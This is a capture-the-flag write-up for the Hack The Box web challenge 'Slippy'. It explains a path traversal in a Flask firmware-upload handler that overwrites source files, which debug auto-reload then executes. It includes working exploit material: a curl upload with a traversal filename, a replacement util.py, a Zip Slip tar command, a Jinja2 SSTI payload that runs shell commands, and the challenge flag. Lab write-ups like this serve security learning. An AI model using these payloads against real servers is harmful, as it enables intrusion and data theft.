---
type: challenge
platform: Hack The Box
category: "web"
difficulty: "easy"
status: Documents
date_started: 2026-09-08
date_completed: 2026-09-08
tags:
  - htb
  - challenge
  - ics
  - scada
  - web
  - flask
  - path_traversal
  - file_upload
  - ssti
  - zip_slip
---

# Slippy

## Overview

**Category:** web
**Difficulty:** easy
**Platform:** Hack The Box
**Date:** 2026-09-08

> [!note] Challenge Scenario
>
> > You've found a portal for a firmware upgrade service, responsible for the deployment and maintenance of rogue androids hunting humans outside the tractor city. The question is… what are you going to do about it?
>
> English summary: Flask web app that accepts a `.tar.gz` firmware upload (`/api/unslippy`). The upload handler blindly saves the file to a path built from the user-controlled filename, and the app runs in Flask debug mode (auto-reload) → write arbitrary files / overwrite source → RCE. Flag is in `/app/flag`.

## Enumeration

Source code is provided. The interesting part of the upload handling:

```python
def extract_from_archive(archive):            # util.py
    tmp = tempfile.gettempdir()
    path = os.path.join(tmp, archive.filename)
    archive.save(path)                        # <-- path controlled by filename!
    ...
```

The Flask app is also running in **debug mode**, so any `.py` change triggers a reload with the new code.

## Vulnerability

- The filename in the multipart request is joined onto `tempfile.gettempdir()` (`/tmp`) with no sanitization → **path traversal** lets me write anywhere the app user can (e.g. `/app/application/util.py`).
- **Flask debug auto-reload** re-imports the overwritten module → my code executes.

## Exploitation

### Overwrite a source file (util.py) and rely on debug reload

I crafted a `util.py` that keeps the app working while adding a route that prints the flag:

```python
def extract_from_archive(archive):
    return False

from flask import Response
from application.blueprints.routes import web

@web.route('/flag')
def slippy_flag():
    return Response(open('/app/flag').read(), mimetype='text/plain')
```

Then I uploaded it, putting the traversal in the upload **filename**:

```bash
curl -s -X POST http://$RHOST:$RPORT/api/unslippy \
  -F "file=@util.py;filename=../../../../../../../../app/application/util.py"
```

After the debug reloader picked it up:

```bash
curl -s http://$RHOST:$RPORT/flag
```

> [!note] The classic HTB "Slippy" route (Uni CTF 2021)
> Two other equivalent techniques are commonly used:
>
> 1. **Zip Slip + SSTI** — pack `../../../app/application/templates/index.html` into a `.tar.gz` and use a Jinja2 SSTI payload in the template:
>
>    ```bash
>    tar -czf evil.tar.gz ../../../app/application/templates/index.html
>    echo '{{ cycler.__init__.__globals__.os.popen("cat /app/flag").read() }}' > index.html
>    ```
>    (`tar` from a temp dir with `index.html` as `../../../app/application/templates/index.html`)
>
> 2. **Overwrite routes.py / 404 handler** — same traversal, but target `application/blueprints/routes.py` or the `@app.errorhandler(404)` so the flag is returned from any page.

> [!info] Tools Used
>
> - `curl`
> - `tar` / Python `tarfile`
> - `evilarc` (https://github.com/ptoomey3/evilarc) for crafting traversal archives

## Flag

`HTB{1_r34lly_l1k3_st34mpunk_r0b0ts!!!}`

## References

- https://www.policytopackets.com/writeups/hackthebox/challenges/slippy/
- https://7rocky.github.io/en/ctf/htb-challenges/web/slippy/
- https://ctftime.org/writeup/31451 (An00bRektn)
- https://platypwnies.de/writeups/2021/htb-uni-quals/web/slippy/